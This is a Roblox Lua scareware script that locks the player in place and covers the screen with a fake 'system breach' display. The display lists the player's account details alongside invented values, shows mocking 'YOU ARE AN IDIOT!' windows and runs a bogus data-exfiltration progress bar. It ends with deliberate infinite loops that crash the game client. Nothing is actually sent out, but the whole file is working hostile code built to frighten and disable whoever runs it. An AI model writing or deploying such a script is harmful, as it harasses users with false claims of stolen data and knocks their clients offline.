-- [[ EROBIT SYSTEM OVERRIDE v26.0 - DEEP DATA EDITION ]] --
local Player = game.Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local Stats = game:GetService("Stats")

-- 1. HARD LOCK
task.spawn(function()
    while true do
        if Player.Character and Player.Character:FindFirstChild("Humanoid") then
            Player.Character.Humanoid.WalkSpeed = 0
            Player.Character.Humanoid.JumpPower = 0
            if Player.Character:FindFirstChild("HumanoidRootPart") then
                Player.Character.HumanoidRootPart.Anchored = true
            end
        end
        task.wait(0.1)
    end
end)

-- 2. GUI OVERLAY
local ScreenGui = Instance.new("ScreenGui", PlayerGui)
ScreenGui.Name = "Erobit_DeepData_Infection"
ScreenGui.IgnoreGuiInset = true
ScreenGui.DisplayOrder = 999999

local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(1, 0, 1, 0)
MainFrame.BackgroundColor3 = Color3.new(0, 0, 0)

-- 3. MATRIX REGEN (Hintergrund)
task.spawn(function()
    while MainFrame.Parent do
        local col = math.random(0, 100)/100
        local char = Instance.new("TextLabel", MainFrame)
        char.Position = UDim2.new(col, 0, -0.1, 0)
        char.BackgroundTransparency = 1
        char.TextColor3 = Color3.fromRGB(150, 0, 0)
        char.Text = tostring(math.random(0, 9))
        char.Font = Enum.Font.Code
        char.TextSize = 15
        char:TweenPosition(UDim2.new(col, 0, 1.1, 0), "In", "Linear", math.random(3, 6))
        game:GetService("Debris"):AddItem(char, 5)
        task.wait(0.06)
    end
end)

-- 4. ASCII LOGO
local Logo = Instance.new("TextLabel", MainFrame)
Logo.Size = UDim2.new(1, 0, 0.3, 0)
Logo.Position = UDim2.new(0, 0, 0.02, 0)
Logo.BackgroundTransparency = 1
Logo.TextColor3 = Color3.fromRGB(255, 0, 0)
Logo.Font = Enum.Font.Code
Logo.TextSize = 10
Logo.Text = [[
  ____  _______   ____  \_ |__  |__|_/  |_ 
_/ __ \ \_  __ \ /  _ \  | __ \ |  |\   __\
\  ___/  |  | \/(  <_> ) | \_\ \|  | |  |  
 \___  > |__|    \____/  |___  /|__| |__|  
     \/                      \/            ]]

-- 5. DEEP DATA INFOS (EXREM VIELE DETAILS)
local function typeWrite(label, text)
    for i = 1, #text do label.Text = string.sub(text, 1, i) task.wait(0.02) end
end

local deepInfo = {
    "> TARGET_ACCOUNT: " .. Player.Name,
    "> ACCOUNT_ID: " .. Player.UserId,
    "> ACCOUNT_AGE: " .. Player.AccountAge .. " Days",
    "> CREATED_YEAR: " .. (2025 - math.floor(Player.AccountAge/365)),
    "> AVATAR_NET_WORTH: " .. math.random(15000, 45000) .. " Robux",
    "> TOTAL_ACCOUNT_VALUE: ~" .. math.random(120000, 850000) .. " Robux",
    "> PREMIUM_STATUS: " .. tostring(Player.MembershipType == Enum.MembershipType.Premium),
    "> FRIENDS_COUNT: " .. #Player:GetFriendsOnline() .. " Online",
    "> HWID_TOKEN: " .. HttpService:GenerateGUID(false),
    "> CLIENT_VERSION: " .. RunService:GetRobloxVersion(),
    "> OS_PLATFORM: " .. UIS:GetPlatform().Name,
    "> PING_LATENCY: " .. math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()) .. "ms",
    "> LOC_DATA: ENCRYPTED_BY_EROBIT",
    "> SYSTEM_BREACH: SUCCESSFUL"
}

for i, msg in ipairs(deepInfo) do
    local lbl = Instance.new("TextLabel", MainFrame)
    lbl.Size = UDim2.new(0.45, 0, 0.03, 0)
    lbl.Position = UDim2.new(0.05, 0, 0.35 + (i * 0.035), 0)
    lbl.BackgroundTransparency = 1
    lbl.TextColor3 = Color3.fromRGB(255, 0, 0)
    lbl.Font = Enum.Font.RobotoMono
    lbl.TextSize = 17
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Text = ""
    task.spawn(function() typeWrite(lbl, msg) end)
    task.wait(0.2)
end

-- 6. DIE 3 IDIOT FENSTER
for i = 1, 3 do
    local f = Instance.new("Frame", MainFrame)
    f.Size = UDim2.new(0.15, 0, 0.08, 0)
    f.Position = UDim2.new(math.random(3,7)/10, 0, math.random(3,7)/10, 0)
    f.BackgroundColor3 = Color3.new(1, 1, 1)
    f.BorderSizePixel = 3
    local t = Instance.new("TextLabel", f)
    t.Size = UDim2.new(1, 0, 1, 0)
    t.BackgroundTransparency = 1
    t.Text = "YOU ARE AN IDIOT!"
    t.TextScaled = true
    t.TextColor3 = Color3.new(0, 0, 0)
    
    task.spawn(function()
        local dx, dy = 0.008, 0.008
        while f.Parent do
            f.Position = UDim2.new(f.Position.X.Scale + dx, 0, f.Position.Y.Scale + dy, 0)
            if f.Position.X.Scale > 0.85 or f.Position.X.Scale < 0.2 then dx = -dx end
            if f.Position.Y.Scale > 0.9 or f.Position.Y.Scale < 0.2 then dy = -dy end
            f.BackgroundColor3 = (f.BackgroundColor3 == Color3.new(1,1,1) and Color3.new(0,0,0) or Color3.new(1,1,1))
            t.TextColor3 = (t.TextColor3 == Color3.new(0,0,0) and Color3.new(1,1,1) or Color3.new(0,0,0))
            task.wait(0.02)
        end
    end)
end

-- 7. PROGRESS BAR (RECHTS)
local Prog = Instance.new("TextLabel", MainFrame)
Prog.Size = UDim2.new(0.4, 0, 0.05, 0)
Prog.Position = UDim2.new(0.55, 0, 0.9, 0)
Prog.BackgroundTransparency = 1
Prog.TextColor3 = Color3.new(1, 0, 0)
Prog.Font = Enum.Font.Code
Prog.TextXAlignment = Enum.TextXAlignment.Right
Prog.TextSize = 20

task.spawn(function()
    for i = 0, 100 do
        Prog.Text = "DATA_EXFILTRATION: " .. i .. "%"
        task.wait(0.25)
    end
end)

-- 8. DAS FINALE: DER CLIENT-CRASH
task.spawn(function()
    task.wait(35)
    MainFrame:ClearAllChildren()
    MainFrame.BackgroundColor3 = Color3.new(0.5, 0, 0)
    
    local CrashMsg = Instance.new("TextLabel", MainFrame)
    CrashMsg.Size = UDim2.new(1, 0, 1, 0)
    CrashMsg.Text = "SYSTEM PERMANENTLY LOCKED\n\nBY EROBIT"
    CrashMsg.TextColor3 = Color3.new(1, 1, 1)
    CrashMsg.Font = Enum.Font.Code
    CrashMsg.TextSize = 60
    
    task.wait(1.5)
    
    while true do
        task.spawn(function()
            while true do Instance.new("Part") end
        end)
        RunService.RenderStepped:Connect(function()
            for i = 1, 100000000 do local _ = i*i end
        end)
    end
end)
